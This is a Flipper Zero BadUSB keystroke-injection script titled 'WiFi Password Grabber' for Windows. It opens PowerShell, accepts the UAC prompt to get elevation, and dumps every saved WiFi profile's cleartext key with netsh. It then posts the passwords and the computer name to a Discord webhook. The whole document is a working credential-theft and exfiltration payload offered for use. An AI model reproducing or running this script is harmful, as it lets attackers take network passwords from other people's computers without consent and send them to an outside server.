REM Title: Flipper Zero BadUSB Payload - WiFi Password Grabber
REM Author: Angrido
REM Target: Windows
DELAY 2000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
CTRL SHIFT ENTER
DELAY 2000
LEFT
DELAY 500
ENTER
STRING $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
ENTER
STRING $message = "WiFi Passwords:`n"
ENTER
STRING foreach ($profileName in $wifiProfiles) {
ENTER
STRING     $profileInfo = (netsh wlan show profile name=""$profileName"" key=clear)
ENTER
STRING     $passwordLine = $profileInfo | Select-String "Key Content|Contenuto chiave"
ENTER
STRING     if ($passwordLine) {
ENTER
STRING         $password = ($passwordLine -split ":")[1].Trim()
ENTER
STRING         $message += "$($profileName): $($password)`n"
ENTER
STRING     }
ENTER
STRING }
ENTER
STRING $Body = @{
ENTER
STRING     'username' = $env:COMPUTERNAME
ENTER
STRING     'content' = $message
ENTER
STRING }
ENTER
STRING $webhook = "YOUR_DISCORD_WEBHOOK"
ENTER
STRING Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhook -Method Post -Body ($Body | ConvertTo-Json)
ENTER
STRING exit
ENTER
